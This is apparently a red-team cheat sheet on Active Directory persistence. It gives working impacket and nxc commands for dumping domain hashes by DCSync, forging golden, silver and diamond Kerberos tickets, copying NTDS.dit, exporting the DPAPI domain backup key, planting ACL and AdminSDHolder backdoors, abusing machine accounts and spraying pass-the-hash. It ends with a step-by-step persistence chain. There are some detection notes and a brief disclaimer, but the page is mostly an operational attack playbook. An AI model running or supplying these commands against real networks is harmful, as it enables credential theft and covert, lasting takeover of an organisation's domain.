---
title: "Persistence — From Kali"
weight: 7
tags: ["ad", "persistence", "dcsync", "golden-ticket", "kali", "impacket"]
---

## Quick Reference

| Technique | Requirement | Detection Risk |
|---|---|---|
| DCSync | Domain Admin or explicit replication rights | High — replication request from non-DC |
| Golden Ticket | krbtgt NTLM + AES256 hash, domain SID | Medium — no TGT event (4768) on DC |
| Silver Ticket | Service account NTLM hash, domain SID, SPN | Low — no DC contact at all |
| Diamond Ticket | krbtgt AES256, valid user credentials | Low — based on a real TGT |
| NTDS.dit VSS | Shell on DC, local admin | High — shadow copy creation event |
| DPAPI Backup Key | Domain Admin, DC access | Medium — LDAP/RPC request to DC |
| ACL-based (DCSync rights) | WriteDACL or GenericAll on domain root | Low — ACL change may not alert |
| Machine Account creation | Any user with MachineAccountQuota > 0 | Low |
| Pass-the-Hash persistence | Local admin hash, no domain rights needed | Low — appears as normal auth |

---

## DCSync

### What It Is

DCSync abuses the **Directory Replication Service (DRS)** protocol. Domain controllers use DRS to replicate directory data between themselves. The `GetNCChanges` function is the core RPC call used. Any account with the following rights on the domain root object can invoke this:

- `DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- `DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

By default, only **Domain Admins**, **Enterprise Admins**, and **Domain Controllers** have these rights. However, they can be delegated to any object.

> **Note:** DCSync is operationally significant because it extracts credential material without touching the filesystem of the DC. No logon session, no file access, no volume access. Detection relies on monitoring for unexpected replication requests from non-DC hosts.

### Dump All Domain Hashes

```bash
secretsdump.py -just-dc TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

Output format: `domain\username:RID:LMHASH:NTHASH:::`

### Dump Only the krbtgt Account

```bash
secretsdump.py -just-dc-user krbtgt TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

This is the most common use — the krbtgt hash is required for golden ticket forgery.

### Dump All NTDS Hashes (NTLM Only)

```bash
secretsdump.py -just-dc-ntds TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

### Authenticate with NTLM Hash Instead of Password

```bash
secretsdump.py \
  -just-dc \
  -hashes :NTLM_HASH \
  TARGET_DOMAIN/DA_USERNAME@DC_IP
```

### Dump a Specific User

```bash
secretsdump.py \
  -just-dc-user USERNAME \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP

# Include computer accounts (note the $ suffix)
secretsdump.py \
  -just-dc-user "DC_HOSTNAME$" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

### Dump with AES Key (Kerberos Auth to DC)

```bash
secretsdump.py \
  -k -no-pass \
  -just-dc \
  TARGET_DOMAIN/DA_USERNAME@DC_HOSTNAME
```

### Granting DCSync Rights via Python (ldap3)

If you have `WriteDACL` on the domain root object, you can grant replication rights to a controlled account without being a Domain Admin:

```python
#!/usr/bin/env python3
from ldap3 import Server, Connection, NTLM, ALL, MODIFY_ADD
from ldap3.protocol.microsoft import security_descriptor_control
import ldap3

DOMAIN_DN = "DC=TARGET,DC=DOMAIN"
CONTROLLED_ACCOUNT = "CN=USERNAME,CN=Users,DC=TARGET,DC=DOMAIN"
DC_IP = "DC_IP"
AUTH_USER = "TARGET_DOMAIN\\DA_USERNAME"
AUTH_PASS = "PASSWORD"

# DS-Replication-Get-Changes
REPL_GET_CHANGES = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
# DS-Replication-Get-Changes-All
REPL_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

server = Server(DC_IP, get_info=ALL)
conn = Connection(server, user=AUTH_USER, password=AUTH_PASS, authentication=NTLM)

if conn.bind():
    print("[+] Connected")
    # Add replication rights to controlled account
    # This requires the account SID and proper DACL modification
    # Use impacket's dacledit.py for a simpler approach (see below)
    print("[*] Use dacledit.py for DACL modifications")
else:
    print("[-] Bind failed")
```

The cleaner impacket-based approach:

```bash
# Grant DCSync rights using dacledit.py
dacledit.py \
  -action write \
  -rights DCSync \
  -principal USERNAME \
  -target-dn "DC=TARGET,DC=DOMAIN" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

After granting rights, `USERNAME` can now run DCSync without Domain Admin:

```bash
secretsdump.py -just-dc TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP
```

---

## Golden Ticket

### What It Is

A Golden Ticket is a forged **Ticket Granting Ticket (TGT)** signed with the `krbtgt` account's secret key. Because every Kerberos authentication flow begins with a TGT request that is validated by the KDC using the `krbtgt` secret, a forged TGT that is correctly signed will be accepted by the KDC to issue any service ticket requested.

The forged TGT does not need to correspond to a real authentication event — the KDC trusts it because it can decrypt and validate the signature.

**Requirements:**
- `krbtgt` NTLM hash (KRBTGT_HASH)
- `krbtgt` AES256 key (KRBTGT_AES256) — preferred to avoid RC4 downgrade alerts
- Domain SID (DOMAIN_SID)
- Domain name (TARGET_DOMAIN)

### Forge the Golden Ticket

```bash
ticketer.py \
  -nthash KRBTGT_HASH \
  -aesKey KRBTGT_AES256 \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -duration 87600 \
  fake_admin
```

Parameters:
- `-nthash` — RC4/NTLM hash of krbtgt
- `-aesKey` — AES256 hash of krbtgt (used when AES encryption is negotiated)
- `-domain` — fully qualified domain name
- `-domain-sid` — domain SID (`S-1-5-21-...`)
- `-duration` — ticket lifetime in hours (87600 = 10 years)
- `fake_admin` — username embedded in the ticket (can be anything)

### Use the Golden Ticket

```bash
export KRB5CCNAME=fake_admin.ccache
klist

# Remote shell on DC
psexec.py -k -no-pass TARGET_DOMAIN/fake_admin@DC_HOSTNAME

# WMI execution
wmiexec.py -k -no-pass TARGET_DOMAIN/fake_admin@DC_HOSTNAME

# SMB file access
smbclient.py -k -no-pass //DC_HOSTNAME/C$

# Remote PowerShell (if WinRM enabled)
evil-winrm -i DC_HOSTNAME -r TARGET_DOMAIN
```

### Access Any Domain-Joined Machine

Golden tickets work against any machine in the domain, not just the DC:

```bash
psexec.py -k -no-pass TARGET_DOMAIN/fake_admin@MEMBER_SERVER_HOSTNAME
wmiexec.py -k -no-pass TARGET_DOMAIN/fake_admin@MEMBER_SERVER_HOSTNAME
```

### Why It Provides Persistence

The Golden Ticket remains valid as long as the `krbtgt` password has not been rotated **twice** (because the KDC keeps both the current and previous `krbtgt` key). A single `krbtgt` password reset is insufficient to invalidate existing forged tickets. Organizations must reset it twice, with a gap, to fully invalidate all outstanding golden tickets.

### Detection Notes

> **Note:** Golden ticket activity may produce Event ID 4769 (TGS-REQ) on the DC without a corresponding Event ID 4768 (AS-REQ) — because the forged TGT was never issued by the DC. Monitor for anomalous encryption types (RC4 where AES is expected), unusually long ticket lifetimes, and tickets with non-standard PAC content.

---

## Silver Ticket

### What It Is

A Silver Ticket is a forged **Ticket Granting Service (TGS)** — a service ticket. Unlike a golden ticket (which targets the KDC), a silver ticket is issued for and validated by the **target service** directly. The service decrypts the ticket using its own secret key and grants access if the PAC appears valid.

**Key property: The DC is never contacted.** No TGT request, no TGS request — just a forged service ticket presented directly to the target service.

**Requirements:**
- Service account NTLM hash (SERVICE_HASH) — obtained via DCSync, Kerberoasting, or secretsdump
- Domain SID (DOMAIN_SID)
- SPN for the target service (SPN)

### Forge a Silver Ticket

```bash
ticketer.py \
  -nthash SERVICE_HASH \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -spn SPN/TARGET_HOSTNAME \
  fake_admin
```

### Service Target Examples

**CIFS — SMB file system access:**

```bash
ticketer.py \
  -nthash SERVICE_HASH \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -spn cifs/TARGET_HOSTNAME \
  fake_admin

export KRB5CCNAME=fake_admin.ccache
smbclient.py -k -no-pass //TARGET_HOSTNAME/C$
```

**HOST — Allows PSExec-style remote service execution:**

```bash
ticketer.py \
  -nthash SERVICE_HASH \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -spn host/TARGET_HOSTNAME \
  fake_admin

export KRB5CCNAME=fake_admin.ccache
psexec.py -k -no-pass TARGET_DOMAIN/fake_admin@TARGET_HOSTNAME
```

**HTTP — WinRM / web access:**

```bash
ticketer.py \
  -nthash SERVICE_HASH \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -spn http/TARGET_HOSTNAME \
  fake_admin

export KRB5CCNAME=fake_admin.ccache
evil-winrm -i TARGET_HOSTNAME -r TARGET_DOMAIN
```

**LDAP — LDAP operations on DC (useful for RBCD, DCSync-like queries):**

```bash
ticketer.py \
  -nthash DC_MACHINE_HASH \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -spn ldap/DC_HOSTNAME \
  fake_admin

export KRB5CCNAME=fake_admin.ccache
ldapsearch -H ldap://DC_HOSTNAME -Y GSSAPI ...
```

**MSSQLSvc — SQL Server access:**

```bash
ticketer.py \
  -nthash MSSQL_SVC_HASH \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -spn MSSQLSvc/DB_HOSTNAME.TARGET_DOMAIN:1433 \
  fake_admin

export KRB5CCNAME=fake_admin.ccache
```

### Limitations

> **Note:** Silver tickets can be mitigated on Windows systems with PAC validation enabled. When PAC validation is active, the service sends the PAC to the DC for verification, which will detect the forgery. Additionally, silver tickets forged with inaccurate or anomalous PAC content (incorrect group memberships, mismatched domain name casing) may be rejected. The Kerberos realm in the SPN should traditionally be uppercase.

Computer account secrets (machine account passwords) rotate every **30 days** by default. Silver tickets forged with a machine account hash will become invalid after the next password rotation unless re-obtained.

---

## Diamond Ticket

### What It Is and How It Differs from Golden Ticket

A **Diamond Ticket** takes a different approach to ticket forgery. Instead of creating a ticket entirely from scratch, it:

1. Requests a **legitimate TGT** from the KDC using valid credentials
2. Decrypts the TGT PAC using the `krbtgt` key
3. Modifies the PAC (e.g., adds group memberships)
4. Re-encrypts and presents the modified TGT

Because the ticket originates from a real AS-REQ/AS-REP exchange, it generates a legitimate Event ID 4768 on the DC. The PAC modification happens offline. This makes diamond tickets significantly harder to detect via event correlation.

### Requirements

- Valid user credentials (USERNAME:PASSWORD or hash)
- `krbtgt` AES256 key (KRBTGT_AES256)

### Forge a Diamond Ticket with ticketer.py

The `-request` flag in impacket's `ticketer.py` requests a real TGT first, then modifies the PAC:

```bash
# Request a legitimate TGT and modify the PAC
ticketer.py \
  -request \
  -aesKey KRBTGT_AES256 \
  -domain TARGET_DOMAIN \
  -domain-sid DOMAIN_SID \
  -groups 512,519,520 \
  -user-id 500 \
  USERNAME
```

Parameters:
- `-request` — request a real TGT before modifying (requires `-user` credentials)
- `-aesKey` — krbtgt AES256 key for PAC decryption and re-signing
- `-groups` — comma-separated RIDs to inject (512=Domain Admins, 519=Enterprise Admins, 520=Group Policy Creator Owners)
- `-user-id` — RID to embed in the PAC

```bash
export KRB5CCNAME=USERNAME.ccache
psexec.py -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME
```

### Detection Comparison

| Property | Golden Ticket | Diamond Ticket |
|---|---|---|
| Generates AS-REQ (4768) | No | Yes |
| Generates TGS-REQ (4769) | Yes | Yes |
| PAC contains real data | No | Partially |
| Requires valid user | No | Yes |
| Survives krbtgt rotation | Until rotated twice | Until rotated twice |
| Detection difficulty | Medium | Higher |

---

## NTDS.dit Extraction

### Via DCSync (Preferred — No File System Access Required)

```bash
# Dump everything
secretsdump.py -just-dc TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP

# Dump with output file
secretsdump.py \
  -just-dc \
  -outputfile ntds_dump \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
# Creates: ntds_dump.ntds (hashes), ntds_dump.ntds.cleartext (if reversible enc)

# NTLM hashes only
secretsdump.py \
  -just-dc-ntds \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

### Via VSS Shadow Copy (Requires Shell on DC)

Volume Shadow Copy Service (VSS) allows snapshot access to locked files including NTDS.dit:

```bash
# Step 1: Create a shadow copy (run inside a shell on the DC)
vssadmin create shadow /for=C:

# Step 2: Note the shadow copy path from output, then copy files
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit" C:\Temp\NTDS.dit
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\Temp\SECURITY

# Step 3: Transfer files to Kali (via SMB, curl, certutil, etc.)

# Step 4: Parse offline with impacket
secretsdump.py \
  -ntds /tmp/NTDS.dit \
  -system /tmp/SYSTEM \
  -security /tmp/SECURITY \
  LOCAL
```

### Via ntdsutil (IFM Method)

The `ntdsutil` IFM (Install From Media) method creates a portable copy of NTDS.dit:

```cmd
# Run on DC
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\IFM" q q
```

This creates `C:\Temp\IFM\Active Directory\ntds.dit` and `C:\Temp\IFM\registry\SYSTEM`. Transfer and parse:

```bash
secretsdump.py \
  -ntds "/tmp/IFM/Active Directory/ntds.dit" \
  -system "/tmp/IFM/registry/SYSTEM" \
  LOCAL
```

> **Note:** VSS shadow copy creation generates Windows event log entries (System log, event ID 7036 VSS service state change, and others). IFM creation via ntdsutil also leaves audit trails. DCSync is operationally cleaner as it generates only network traffic.

---

## DPAPI Domain Backup Key

### What It Is

**DPAPI (Data Protection API)** is a Windows subsystem for encrypting secrets (saved browser credentials, Wi-Fi passwords, RDP credentials, etc.). Each secret is encrypted with a **masterkey**. Masterkeys are themselves encrypted with the user's password.

To support password resets (the user's password changes, so the masterkey encryption changes), Active Directory stores a **domain backup key**. This key is generated once during domain creation and **never automatically rotated** — it persists indefinitely unless an administrator explicitly regenerates it.

With the domain backup key, an attacker can decrypt **any DPAPI-protected secret for any user in the domain**, regardless of the user's current password.

### Extract the Domain Backup Key

```bash
# Export domain DPAPI backup key to PVK file
dpapi.py backupkeys \
  --export \
  -t TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP

# With hash authentication
dpapi.py backupkeys \
  --export \
  -t TARGET_DOMAIN/DA_USERNAME@DC_IP \
  -hashes :NTLM_HASH
```

This produces a file named `domain_backup_key_0x...pvk` (PVK format, compatible with Mimikatz and impacket).

### Decrypt a Masterkey Using the Backup Key

```bash
dpapi.py masterkey \
  -file /path/to/masterkey_file \
  -pvk domain_backup_key.pvk
```

The masterkey file is located at:
`%APPDATA%\Microsoft\Protect\<USER_SID>\<GUID>` on the target machine.

### Decrypt Credential Manager Entries

```bash
# Decrypt a Credential Manager blob
dpapi.py credential \
  -file /path/to/credential_blob \
  -masterkey MASTERKEY_HEX
```

Credential blobs are at: `%LOCALAPPDATA%\Microsoft\Credentials\` or `%APPDATA%\Microsoft\Credentials\`

### Decrypt Vault Entries

```bash
dpapi.py vault \
  -file /path/to/vault_credential \
  -masterkey MASTERKEY_HEX
```

### Why This Is a Persistence Mechanism

The domain backup key never rotates unless explicitly regenerated. An attacker who extracts it once can decrypt DPAPI secrets indefinitely — even after the user changes their password. This includes:

- Saved RDP credentials
- Browser-saved passwords (if using DPAPI-backed storage)
- Wi-Fi pre-shared keys
- Outlook email credentials
- Any application using DPAPI

> **Note:** The domain backup key extraction is performed via a standard LDAP/RPC call to the DC. It generates Windows event ID 4662 (An operation was performed on an object) on domain controllers with object access auditing enabled. Monitoring for `GetSecretValue` calls to the DPAPI backup key object is the primary detection mechanism.

---

## ACL-Based Persistence

ACL-based persistence grants an attacker-controlled account elevated rights through Active Directory ACEs, surviving password resets and group membership changes.

### Grant DCSync Rights to Controlled Account

```bash
# Using dacledit.py (impacket)
dacledit.py \
  -action write \
  -rights DCSync \
  -principal CONTROLLED_ACCOUNT \
  -target-dn "DC=TARGET,DC=DOMAIN" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP

# Verify the ACE was added
dacledit.py \
  -action read \
  -target-dn "DC=TARGET,DC=DOMAIN" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP | grep CONTROLLED_ACCOUNT
```

Once granted, the controlled account can run DCSync at any time:

```bash
secretsdump.py -just-dc TARGET_DOMAIN/CONTROLLED_ACCOUNT:PASSWORD@DC_IP
```

### Add GenericAll over Domain Admins Group

```bash
dacledit.py \
  -action write \
  -rights FullControl \
  -principal CONTROLLED_ACCOUNT \
  -target-dn "CN=Domain Admins,CN=Users,DC=TARGET,DC=DOMAIN" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

With `GenericAll` over Domain Admins, the controlled account can add any user to the group:

```bash
# Add controlled account to Domain Admins
net rpc group addmem "Domain Admins" CONTROLLED_ACCOUNT \
  -U TARGET_DOMAIN/CONTROLLED_ACCOUNT%PASSWORD \
  -S DC_IP
```

### WriteDACL on Domain Root

`WriteDACL` on the domain root object (`DC=TARGET,DC=DOMAIN`) allows granting arbitrary rights at a later time:

```bash
dacledit.py \
  -action write \
  -rights WriteDacl \
  -principal CONTROLLED_ACCOUNT \
  -target-dn "DC=TARGET,DC=DOMAIN" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

This is a powerful and stealthy persistence mechanism: the controlled account holds no elevated rights until they are needed, at which point DCSync or other rights are self-granted.

> **Note:** ACL changes to high-value objects like the domain root, Domain Admins, and AdminSDHolder are logged as Event ID 5136 (directory service object modification). Defenders using BloodHound or similar tools will detect these misconfigurations during security posture reviews.

### AdminSDHolder Persistence

`AdminSDHolder` is a template container whose ACL is propagated to all protected AD objects (Domain Admins, Enterprise Admins, etc.) every 60 minutes by the `SDPropagator` process. Modifying `AdminSDHolder`'s ACL with a controlled account's `GenericAll` is a highly persistent ACL backdoor:

```bash
dacledit.py \
  -action write \
  -rights FullControl \
  -principal CONTROLLED_ACCOUNT \
  -target-dn "CN=AdminSDHolder,CN=System,DC=TARGET,DC=DOMAIN" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

Within 60 minutes, `CONTROLLED_ACCOUNT` will have `GenericAll` over all protected groups and accounts in the domain.

---

## Machine Account Persistence

### Create a Machine Account

By default, any domain user can create up to 10 machine accounts (`ms-DS-MachineAccountQuota = 10`). Machine accounts can be used for RBCD (Resource-Based Constrained Delegation) attacks, Kerberoasting, and lateral movement.

```bash
addcomputer.py \
  -computer-name ATTACKER_COMPUTER$ \
  -computer-pass COMPUTER_PASSWORD \
  TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP
```

### Use the Machine Account for RBCD

```bash
# Grant RBCD from attacker computer to target computer
rbcd.py \
  -action write \
  -delegate-to "TARGET_COMPUTER$" \
  -delegate-from "ATTACKER_COMPUTER$" \
  TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP

# Request service ticket impersonating admin
getST.py \
  -spn cifs/TARGET_COMPUTER.TARGET_DOMAIN \
  -impersonate Administrator \
  -dc-ip DC_IP \
  TARGET_DOMAIN/ATTACKER_COMPUTER$:COMPUTER_PASSWORD

export KRB5CCNAME=Administrator@cifs_TARGET.ccache
smbclient.py -k -no-pass //TARGET_COMPUTER.TARGET_DOMAIN/C$
```

### Use the Machine Account for Kerberoasting Setup

Machine accounts can have SPNs registered, making them Kerberoastable:

```bash
# Register an SPN on the machine account
addspn.py \
  -u TARGET_DOMAIN/DA_USERNAME \
  -p PASSWORD \
  -s SPN/ATTACKER_COMPUTER \
  DC_IP
```

---

## Pass-the-Hash Long-Term Persistence

### Concept

NTLM hash authentication does not require the plaintext password. A harvested hash can be used indefinitely until the account password is changed. For local administrator accounts sharing the same password across a fleet (common in environments without LAPS), a single hash provides access to every machine.

### Harvest Hashes via secretsdump

```bash
# Local SAM dump (requires admin access to target)
secretsdump.py TARGET_DOMAIN/DA_USERNAME:PASSWORD@TARGET_IP \
  -sam -outputfile sam_hashes

# Remote SAM via PTH
secretsdump.py \
  -hashes :NTLM_HASH \
  TARGET_DOMAIN/Administrator@TARGET_IP
```

### Pass-the-Hash Lateral Movement

```bash
# PsExec with hash
psexec.py -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@TARGET_IP

# WMIExec
wmiexec.py -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@TARGET_IP

# SMBExec
smbexec.py -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@TARGET_IP

# CrackMapExec spray across a subnet
nxc smb TARGET_IP/24 -u Administrator -H NTLM_HASH --local-auth
```

### Hash Reuse Across Fleet

```bash
# Spray hash against all hosts in a range
nxc smb TARGET_IP/24 \
  -u Administrator \
  -H NTLM_HASH \
  --local-auth \
  -x "whoami" \
  --continue-on-success
```

> **Note:** Windows Credential Guard (available from Windows 10/Server 2016) prevents NTLM hash extraction from LSASS memory. Where Credential Guard is deployed, PTH from LSASS-dumped hashes is not possible. NTDS-derived hashes (from DCSync) remain usable regardless of Credential Guard on endpoints.

---

## Putting It All Together: Persistence Chain

```
[Starting point: Domain Admin access to TARGET_DOMAIN]

1. DCSYNC — extract all hashes
   secretsdump.py -just-dc TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
   → krbtgt NT + AES256
   → all domain user NT hashes

2. GOLDEN TICKET — long-term TGT access
   ticketer.py -nthash KRBTGT_HASH -aesKey KRBTGT_AES256 \
     -domain TARGET_DOMAIN -domain-sid DOMAIN_SID -duration 87600 fake_admin
   → survives DA account deletion/password change
   → invalid only after krbtgt rotated twice

3. DPAPI BACKUP KEY — credential harvesting
   dpapi.py backupkeys --export -t TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
   → decrypt any user's saved credentials indefinitely

4. ACL BACKDOOR — self-healing privilege
   dacledit.py -action write -rights DCSync -principal BACKDOOR_USER \
     -target-dn "DC=TARGET,DC=DOMAIN" TARGET_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
   → re-run DCSync at any time from low-priv account

5. MACHINE ACCOUNT — stealthy foothold
   addcomputer.py -computer-name STEALTH$ -computer-pass PASS \
     TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP
   → use for RBCD, appears as legitimate computer object

6. LOCAL ADMIN HASHES — lateral movement
   nxc smb TARGET_IP/24 -u Administrator -H NTLM_HASH --local-auth
   → maintain access across all machines sharing same local admin hash
```

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
